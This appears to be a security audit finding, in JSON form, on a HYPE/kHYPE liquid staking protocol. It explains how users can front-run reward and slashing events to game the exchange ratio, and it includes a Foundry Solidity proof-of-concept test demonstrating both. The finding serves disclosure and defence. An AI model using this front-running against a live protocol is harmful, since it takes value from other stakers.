  "body": "## Finding description and impact\n\nThe protocol’s conversion of HYPE to kHYPE relies on an exchange ratio computed in `StakingAccountant::_getExchangeRatio` based on the aggregate of the total staked amount, rewards, claimed funds, and slashing amounts as reported by the `ValidatorManager`. Because the rewards and slashing amounts are read on demand from an external source, an attacker can front-run rewards and slashing events and potentially game the system.\n\nIf rewards are accredited in intervals longer than `StakingManager::withdrawalDelay`, attackers can exploit front-running reward events. If staked amounts are sufficiently large, front-running slashing event is always profitable as the cost of calling the `queueWithdrawal` is lower than the penalty avoided.\n\nFor example:\n - When a rewards event is about to be recorded, the exchange ratio (totalHYPE/totalKHYPESupply) is lower since the rewards have not yet been added. Users can just wait for the reward event to occur to front-run it and `stake` and receive the rewards instead of staking in the intended way.\n\n - Conversely, a user can front-run the slashing event and `queueWithdrawal` the funds to avoid the penalization.\n\nUsers are incentivized to stake immediately before rewards events occur, which undermines the protocol’s intended distribution of rewards. Similarly, users could `queueWithdrawal` their funds just prior to a slashing event to avoid incurring the associated penalties, compromising the protocol’s fairness and stability.\n\nFor sufficiently large amounts, exploiting this vulnerability can yield significant profits.\n\n## Recommended mitigation steps\n\nFixing this is not trivial, one potential approach could be to not rely on external sources.",
  "proof_of_concept": "``` javascript\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"./Base.t.sol\";\nimport \"../src/interfaces/IStakingManager.sol\";\n\ncontract StakingManagerTest is BaseTest {\n    address public validator;\n\n    function setUp() public override {\n        super.setUp();\n\n        // Setup validator addresses\n        validator = makeAddr(\"validator\");\n\n        // Grant roles\n        vm.startPrank(admin);\n        stakingManager.grantRole(stakingManager.OPERATOR_ROLE(), operator);\n        stakingManager.grantRole(stakingManager.MANAGER_ROLE(), manager);\n        vm.stopPrank();\n    }\n\n    function testAvoidSlashing() public {\n        address user2 = makeAddr(\"user2\");\n\n        // Setup initial stake and withdrawal\n        uint256 stakeAmount = 1 ether;\n        vm.startPrank(manager);\n        validatorManager.activateValidator(validator);\n        validatorManager.setDelegation(address(stakingManager), validator);\n        vm.stopPrank();\n\n        vm.deal(user, stakeAmount);\n        vm.prank(user);\n        stakingManager.stake{value: stakeAmount}();\n\n        vm.deal(user2, stakeAmount);\n        vm.prank(user2);\n        stakingManager.stake{value: stakeAmount}();\n\n        // User front-runs slashing event\n        uint256 hyperUser = stakingManager.stakingAccountant().kHYPEToHYPE(kHYPE.balanceOf(user));\n        console.log(\"User front-running slashing event will receive: \", hyperUser);\n\n        // Slashing event is reported\n        vm.prank(address(oracleManager));\n        validatorManager.reportSlashingEvent(validator, 500);\n\n        // User2 queue withdrawal after slashing event\n        uint256 hyperUser2 = stakingManager.stakingAccountant().kHYPEToHYPE(kHYPE.balanceOf(user2));\n        console.log(\"User2 will receive after slashing event: \", hyperUser2);\n    }\n\n    function testRewards() public {\n        address user2 = makeAddr(\"user2\");\n\n        // Setup initial stake and withdrawal\n        uint256 stakeAmount = 1 ether;\n        vm.startPrank(manager);\n        validatorManager.activateValidator(validator);\n        validatorManager.setDelegation(address(stakingManager), validator);\n        vm.stopPrank();\n\n        // User2 stakes\n        vm.deal(user2, stakeAmount);\n        vm.prank(user2);\n        stakingManager.stake{value: stakeAmount}();\n\n        // 1 month latter User front-runs rewards event\n        vm.deal(user, stakeAmount);\n        vm.prank(user);\n        stakingManager.stake{value: stakeAmount}();\n\n        // Rewards event is reported\n        vm.prank(address(oracleManager));\n        validatorManager.reportRewardEvent(validator, 500);\n\n        uint256 hyperUser = stakingManager.stakingAccountant().kHYPEToHYPE(kHYPE.balanceOf(user));\n\n        uint256 hyperUser2 = stakingManager.stakingAccountant().kHYPEToHYPE(kHYPE.balanceOf(user2));\n        \n        // Both users have the same rewards even though user2 staked 1 month before\n        assert(hyperUser == hyperUser2);\n    }\n}\n```",
